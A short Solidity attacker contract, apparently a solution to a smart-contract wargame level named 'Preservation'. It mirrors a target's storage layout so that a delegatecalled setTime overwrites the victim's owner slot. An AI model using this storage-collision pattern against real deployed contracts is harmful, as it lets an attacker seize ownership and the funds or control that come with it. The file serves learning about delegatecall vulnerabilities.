// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttack {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
    owner = msg.sender;
  }
}